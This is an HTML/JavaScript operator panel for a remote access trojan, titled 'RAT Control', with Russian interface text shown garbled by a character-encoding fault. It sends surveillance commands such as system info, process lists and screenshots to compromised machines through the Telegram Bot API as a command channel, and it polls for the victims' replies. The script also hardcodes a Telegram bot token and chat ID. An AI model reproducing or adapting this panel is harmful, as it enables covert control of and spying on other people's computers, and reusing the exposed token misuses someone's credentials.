<!DOCTYPE html>
<html>
<head>
    <title>RAT Control</title>
    <meta charset="UTF-8">
    <style>
        body { 
            font-family: Arial; 
            padding: 20px; 
            background: #f0f0f0;
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        .status {
            background: #28a745;
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            font-weight: bold;
        }
        .button-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        button { 
            padding: 15px; 
            background: #0088cc; 
            color: white; 
            border: none; 
            border-radius: 10px; 
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: scale(1.05);
            background: #006699;
        }
        .output { 
            background: white; 
            padding: 20px; 
            border-radius: 10px; 
            min-height: 200px;
            white-space: pre-wrap;
            font-family: monospace;
            font-size: 14px;
            line-height: 1.6;
            border: 2px solid #ddd;
            overflow-y: auto;
            max-height: 500px;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top-color: #0088cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .message {
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
        }
        .message.incoming {
            background: #e3f2fd;
            border-left: 4px solid #0088cc;
        }
        .message.outgoing {
            background: #f1f8e9;
            border-left: 4px solid #4caf50;
        }
        .timestamp {
            color: #666;
            font-size: 11px;
            float: right;
        }
    </style>
</head>
<body>
    <h1>ü§ñ RAT CONTROL</h1>
    
    <div class="status" id="status">
        <span id="statusText">‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ –±–æ—Ç—É</span>
        <span id="loading" style="display: none;" class="loading"></span>
    </div>
    
    <div class="button-grid">
        <button onclick="sendCommand('info')">üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</button>
        <button onclick="sendCommand('cpu')">‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä</button>
        <button onclick="sendCommand('ram')">üíæ –ü–∞–º—è—Ç—å</button>
        <button onclick="sendCommand('disk')">üíø –î–∏—Å–∫</button>
        <button onclick="sendCommand('screen')">üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç</button>
        <button onclick="sendCommand('processes')">üìã –ü—Ä–æ—Ü–µ—Å—Å—ã</button>
    </div>

    <div id="output" class="output">
        <div class="message incoming">
            üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–Ω–æ–ø–∫—É –¥–ª—è –Ω–∞—á–∞–ª–∞.
            <span class="timestamp">—Ç–æ–ª—å–∫–æ —á—Ç–æ</span>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
        const CHAT_ID = 7266658879;
        let lastUpdateId = 0;
        let messageHistory = [];

        // –§—É–Ω–∫—Ü–∏—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —á–∞—Ç
        function addMessage(text, type = 'incoming') {
            const output = document.getElementById('output');
            const time = new Date().toLocaleTimeString();
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${type}`;
            
            // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç
            let formattedText = text;
            if (text.includes('```')) {
                formattedText = text.replace(/```/g, '');
            }
            
            messageDiv.innerHTML = `${formattedText.replace(/\n/g, '<br>')}<span class="timestamp">${time}</span>`;
            output.appendChild(messageDiv);
            output.scrollTop = output.scrollHeight;
            
            messageHistory.push({text, type, time});
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã
        async function sendCommand(cmd) {
            addMessage(`‚û°Ô∏è –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã: ${cmd}`, 'outgoing');
            document.getElementById('statusText').innerText = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞...';
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: cmd
                    })
                });
                
                const data = await response.json();
                if (data.ok) {
                    document.getElementById('statusText').innerText = '‚úÖ –ö–æ–º–∞–Ω–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞';
                } else {
                    document.getElementById('statusText').innerText = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏';
                    addMessage(`‚ùå –û—à–∏–±–∫–∞: ${data.description}`, 'incoming');
                }
            } catch (e) {
                document.getElementById('statusText').innerText = '‚ùå ' + e.message;
                addMessage(`‚ùå –û—à–∏–±–∫–∞: ${e.message}`, 'incoming');
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –æ—Ç–≤–µ—Ç–æ–≤ –æ—Ç –±–æ—Ç–∞
        async function getUpdates() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        
                        if (update.message && update.message.text) {
                            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –Ω–∞—à–∞ –ª–∏ —ç—Ç–æ –∫–æ–º–∞–Ω–¥–∞
                            const isOurCommand = update.message.text.length < 20 && 
                                                ['info', 'cpu', 'ram', 'disk', 'screen', 'processes'].includes(update.message.text.toLowerCase());
                            
                            if (!isOurCommand) {
                                addMessage(`üì© ${update.message.text}`, 'incoming');
                                document.getElementById('statusText').innerText = '‚úÖ –ù–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ';
                            }
                        }
                        
                        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ç–æ
                        if (update.message && update.message.photo) {
                            addMessage(`üì∏ –ü–æ–ª—É—á–µ–Ω —Å–∫—Ä–∏–Ω—à–æ—Ç (—Å–º–æ—Ç—Ä–∏—Ç–µ –≤ Telegram)`, 'incoming');
                        }
                    });
                }
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π:', e);
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ–ª—É—á–µ–Ω–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –∫–∞–∂–¥—ã–µ 3 —Å–µ–∫—É–Ω–¥—ã
        setInterval(getUpdates, 3000);
        
        // –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        addMessage('‚úÖ –°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞ –∫ —Ä–∞–±–æ—Ç–µ. –ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–Ω–æ–ø–∫—É.', 'incoming');
    </script>
</body>
</html>
